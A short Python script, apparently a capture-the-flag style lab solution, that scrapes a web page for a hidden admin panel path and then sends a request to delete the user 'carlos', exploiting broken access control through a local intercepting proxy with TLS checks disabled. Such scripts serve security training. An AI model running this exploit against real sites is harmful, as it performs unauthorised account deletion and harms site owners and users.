import requests,argparse,urllib3,re
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
from bs4 import BeautifulSoup

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}

def banner():
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format('broken access control',font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    return parser.parse_args()


def delet_user(url,admin_path,cookies):
    url_to_deltUser=url+admin_path+'/delete?username=carlos'

    try:
        # sent get request to delete user carlos
        r=requests.get(url=url_to_deltUser,verify=False,proxies=proxies,timeout=1,cookies=cookies)

        if 'carlos' not in r.text:
            print(colored('[+] we\'ve deleted the user carlos','green'))
        else:
            print(colored('[+] we\'ve not deleted the user carlos','red'))

    except Exception as e:
        print(colored(e,'red'))
        

    

def find_admin_panel(url):
    # get the cookies
    try:
        r=requests.get(url=url,verify=False,proxies=proxies,timeout=1)
        session_cookie = r.cookies.get_dict().get('session')
        cookies={'session':session_cookie}
    except Exception as e:
        print(colored(e,'red'))

    # find admin panel
    soup = BeautifulSoup(r.text, 'html.parser')
    admin_instances = soup.find(string=re.compile("/admin-"))
    admin_path = re.search("href', '(.*)'", admin_instances).group(1)
    if admin_path:
        print(colored(f'[+] we\'ve found the admin panel : {admin_path}','green'))
        delet_user(url,admin_path,cookies)


if __name__=='__main__':
    banner()
    url=parsearg().url
    url=str(url).rstrip('/')

    print(colored('[+] Trying to finde admin panel','blue'))
    find_admin_panel(url)
